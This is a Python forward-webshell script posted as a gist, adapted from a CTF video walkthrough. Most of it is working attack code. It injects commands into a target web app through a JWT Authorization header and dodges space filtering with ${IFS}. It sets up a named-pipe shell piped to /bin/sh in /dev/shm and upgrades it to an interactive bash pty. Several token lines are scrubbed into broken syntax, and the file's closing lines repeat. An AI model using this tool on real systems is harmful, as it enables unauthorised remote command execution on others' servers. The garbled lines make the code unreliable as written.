#date: 2023-05-09T17:07:04Z
#url: https://api.github.com/gists/e3c31721b8e59ab827a44e18d9784d87
#owner: https://api.github.com/users/Cashiuus

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf -- Updates for 2023: Cashiuus

## =======[ IMPORTS ]========= ##
import argparse
import base64
import random
import sys
import threading
import time

import jwt
import requests


class WebShell(object):
    """
        Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    """
    def __init__(self, url, cmd=None, use_proxy=False, interval=1.3):
        # self.url = r"http://172.16.1.22:3000"
        self.url = url
        self.interval = interval
        self.use_proxy = use_proxy

        if not self.url.startswith("http"):
            print("[ERR] You must provide a valid target URL for this")
            sys.exit(1)

        if self.use_proxy:
            # Send all our traffic through Burp or another proxying tool
            self.proxies = {'http': 'http://127.0.0.1:8080'}
        else:
            self.proxies = None

        # If we pass in a cmd, just do the cmd and exit
        if cmd:
            result = self.run_raw_cmd(cmd)
            print(result)
            sys.exit()

        self.session = random.randrange(10000, 99999)
        print(f"[*] Session ID: {self.session}")
        self.stdin = f'/dev/shm/input.{self.session}'
        self.stdout = f'/dev/shm/output.{self.session}'

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.run_raw_cmd(MakeNamedPipes, timeout=10)

        # set up read thread
        print("[*] Setting up read thread")
        thread = threading.Thread(target=self.read_thread, args=())
        thread.daemon = True
        thread.start()

        # -- end of init --
        return

    def read_thread(self):
        """ Read $session, output text to screen & wipe session
        """
        output = f"/bin/cat {self.stdout}"
        output = output.replace(' ', '${IFS}')
        while True:
            # NOTE: If you hit an unreachable target, this will infinite loop, regardless...
            result = self.run_raw_cmd(output)
            if result:
                print(result)
                clear_output = f'echo -n "" > {self.stdout}'
                # clear_output = clear_output.replace(' ', '${IFS}')
                self.run_raw_cmd(clear_output)
            time.sleep(self.interval)
        return

    def run_raw_cmd(self, cmd, timeout=10):
        """ Execute Command
        """
        # MODIFY THIS: This is where your payload code goes
        # cmd = "ls${IFS}-al${IFS}/dev/shm"

        replace_spaces = True
        if replace_spaces:
            # Swap out spaces, because they are blocked, we bypass it using ${IFS}
            cmd = cmd.replace(' ', '${IFS}')

        payload = {'cmd': cmd}
        token = "**********"='HS256')
        # token = "**********"='HS256')

        # headers = {'Authorization': "**********"
        headers = {
            'Authorization': "**********"
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
            }

        # Another place shell can be used sometimes
        # headers = {'User-Agent': cmd}

        print(f"[DBG] Cleartext payload: {payload}")
        #print(f"[DBG] JWT Encoded token: "**********"

        try:
            print("[*] Requesting result of command execution, please wait...")
            r = requests.get(self.url, headers=headers, proxies=self.proxies, timeout=timeout)
            return r.text
        except TimeoutError as e:
            print("Timeout Error, try again")
            sys.exit()
        #    print(f"[ERR] Exception during get request: {e}")
        #    return

    def write_cmd(self, cmd):
        """ Send b64'd command to run_raw_cmd()
        """
        b64cmd = base64.b64encode('{}\n'.format(
            cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        stage_cmd = stage_cmd.replace(' ', '${IFS}')
        self.run_raw_cmd(stage_cmd)
        time.sleep(self.interval * 1.1)
        return

    def upgrade_shell(self):
        """ Attempt a known method of upgrading our shell for functionality
        """
        shell_upgrade_cmd = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        shell_upgrade_cmd = shell_upgrade_cmd.replace(' ', '${IFS}')
        print(f"[*] Sending shell upgrade command: {shell_upgrade_cmd}")
        self.write_cmd(shell_upgrade_cmd)
        return
    # -- End of WebShell class --


def main():
    parser = argparse.ArgumentParser(description="Custom forward webshell utility, originally by ippsec")
    parser.add_argument('target', help='URL of target') # positional arg
    parser.add_argument('-c', '--cmd', dest='cmd', help='Pass an initial command to run')

    args = parser.parse_args()

    if args.cmd:
        cmd = args.cmd
    else:
        cmd = None

    # S = WebShell(args.target, cmd=cmd)
    # Or you can proxy it all through Burp to help troubleshoot
    S = WebShell(args.target, cmd=cmd, use_proxy=True)

    # Endless loop
    prompt = "Enter Cmd (e.g. upgrade) > "
    while True:
        try:
            print()
            cmd = input(prompt)
            if cmd == "upgrade":
                prompt = ""
                S.upgrade_shell()
            else:
                S.write_cmd(cmd)
        except KeyboardInterrupt:
            sys.exit(0)

    return


if __name__ == '__main__':
    main()
t KeyboardInterrupt:
            sys.exit(0)

    return


if __name__ == '__main__':
    main()
